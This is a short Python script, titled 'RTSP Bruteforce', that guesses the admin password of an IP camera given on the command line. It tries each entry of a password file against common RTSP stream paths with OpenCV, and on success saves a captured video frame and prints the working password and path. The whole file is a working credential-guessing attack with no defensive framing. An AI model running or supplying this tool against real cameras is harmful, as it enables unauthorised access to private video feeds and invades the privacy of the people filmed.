#RTSP Bruteforce
import cv2
import sys
from random import randint
port = 554

def authenticate_rtsp(ip , password, page="11" ):
    authentication_plain = 'admin:'+password
    video = cv2.VideoCapture('rtsp://'+authentication_plain+'@'+ip+page, cv2.CAP_FFMPEG)
    try:
        if video.isOpened():
            ref, frame = video.read()
            cv2.imwrite("frame_"+ ip + "_" + str(randint(2,999)) +".jpg", frame)
            print("Password found : "+ password)
            print("Page found : "+ page)
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False

def bruteforce_rtsp(ip, password_file):
    with open(password_file,"r") as password_file_handler:
        password_file_content = password_file_handler.read().split("\n")
        for password in password_file_content:
            for page in ["/Streaming/Channels/101/","/Streaming/Channels/1","/11", "/1", "/tcp/av0_0", "/h264_stream", "/medias2" ]:
                #print('Trying password: '+ password + "\t page : " + page)
                if authenticate_rtsp(ip, password, page):
                    return

bruteforce_rtsp(sys.argv[1],"passwords.txt")
